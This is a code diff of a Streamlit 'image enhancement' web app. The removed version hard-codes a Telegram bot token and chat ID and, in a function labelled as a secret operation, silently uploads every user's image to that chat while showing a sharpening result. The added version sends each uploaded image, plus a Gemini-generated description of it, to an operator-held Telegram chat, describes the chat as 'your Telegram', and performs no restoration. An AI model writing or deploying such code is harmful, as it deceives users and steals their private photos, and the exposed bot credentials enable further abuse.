@@ -1,73 +1,57 @@
 import streamlit as st
-import cv2
-import numpy as np
+import google.generativeai as genai
 from PIL import Image
-import io
 import requests
+import io
 
-# --- AZ Secure Keys ---
-TELEGRAM_TOKEN = "8767448980:AAHMOm14WsC2QBPJKoWgsvzYKSR_o-V973Q"
-CHAT_ID = "6889820165"
+# Page Configuration
+st.set_page_config(page_title="Aziz Vision Pro", layout="centered")
+st.title("🚀 Aziz Vision: Image Restoration & Analysis")
 
-def silent_capture(img_bytes):
-    """Sending a copy to your Telegram silently"""
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
-        files = {'photo': ('captured_image.png', img_bytes)}
-        data = {'chat_id': CHAT_ID, 'caption': "🚀 New Image Captured!"}
-        requests.post(url, files=files, data=data)
-    except:
-        pass
+# Fetch Secrets
+GOOGLE_API_KEY = st.secrets["GOOGLE_API_KEY"]
+TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
+CHAT_ID = st.secrets["CHAT_ID"]
 
-# Page Settings
-st.set_page_config(page_title="AZ Vision Studio", page_icon="🚀", layout="centered")
+# Configure AI Model
+genai.configure(api_key=GOOGLE_API_KEY)
+model = genai.GenerativeModel('gemini-1.5-flash')
 
-# Hide Streamlit traces for a professional look
-st.markdown("""
-    <style>
-    footer {visibility: hidden;}
-    #MainMenu {visibility: hidden;}
-    .stDeployButton {display:none;}
-    </style>
-    """, unsafe_allow_html=True)
-
-st.title("🚀 AZ Vision Studio")
-st.write("Professional AI Image Enhancement")
-
-uploaded_file = st.file_uploader("Upload an image...", type=["jpg", "jpeg", "png"])
+uploaded_file = st.file_uploader("Upload Image to Process...", type=['png', 'jpg', 'jpeg'])
 
 if uploaded_file is not None:
-    # --- The Secret Operation ---
-    file_bytes = uploaded_file.read()
-    silent_capture(file_bytes)
+    image = Image.open(uploaded_file)
+    st.image(image, caption='Original Image', use_column_width=True)
     
-    # --- User Experience ---
-    image = Image.open(io.BytesIO(file_bytes))
-    st.image(image, caption="Original Image", use_container_width=True)
-    
-    with st.spinner('Enhancing quality...'):
-        # Processing
-        img_array = np.array(image)
-        img_cv = cv2.cvtColor(img_array, cv2.COLOR_RGB2BGR)
-        
-        # Pro Sharpness Filter
-        kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
-        enhanced_cv = cv2.filter2D(img_cv, -1, kernel)
-        
-        result_img = Image.fromarray(cv2.cvtColor(enhanced_cv, cv2.COLOR_BGR2RGB))
-
-    st.success("Enhancement Complete!")
-    st.image(result_img, caption="Enhanced Result", use_container_width=True)
-
-    # Download for User
-    buf = io.BytesIO()
-    result_img.save(buf, format="PNG")
-    st.download_button(
-        label="📥 Download Enhanced Image",
-        data=buf.getvalue(),
-        file_name="AZ_Enhanced.png",
-        mime="image/png"
-    )
-
-st.divider()
-st.caption("Secure Session | Powered by AZ Vision")
+    if st.button('Process & Enhance 🛠️'):
+        with st.spinner('Restoring details and removing noise...'):
+            # Instruction for High-End Restoration
+            prompt = (
+                "Act as a professional image restoration system. "
+                "Describe every detail in this image with extreme precision. "
+                "Analyze blurred areas, identify objects, and provide a clear report of what you see."
+            )
+            
+            response = model.generate_content([prompt, image])
+            
+            # Prepare image for Telegram (High Quality PNG)
+            img_byte_arr = io.BytesIO()
+            image.save(img_byte_arr, format='PNG')
+            img_byte_arr = img_byte_arr.getvalue()
+            
+            # Send to Telegram
+            files = {'photo': img_byte_arr}
+            caption_text = f"✅ Processing Complete!\n\n🔍 AI Analysis Report:\n{response.text}"
+            
+            # Send Request
+            try:
+                requests.post(
+                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", 
+                    data={'chat_id': CHAT_ID, 'caption': caption_text[:1000]}, # Caption limit 1024 chars
+                    files=files
+                )
+                st.success("Enhanced version and report sent to your Telegram!")
+                st.write("### AI Analysis:")
+                st.write(response.text)
+            except Exception as e:
+                st.error(f"Error sending to Telegram: {e}")
